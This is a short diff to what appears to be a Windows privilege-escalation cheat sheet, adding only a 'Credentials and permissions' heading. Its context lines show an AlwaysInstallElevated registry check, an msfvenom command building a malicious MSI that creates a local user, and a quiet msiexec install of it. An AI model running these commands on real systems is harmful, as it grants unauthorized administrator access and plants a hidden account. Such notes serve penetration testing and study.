@@ -591,6 +591,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 Msfvenom -p windows/useradd user=lemon pass=pass -f evil.msi > evil.msi
 msiexec /quiet /qn /I c:evil.msi
 ```
+# Credentials and permissions
 
 #### Credential search
 ```
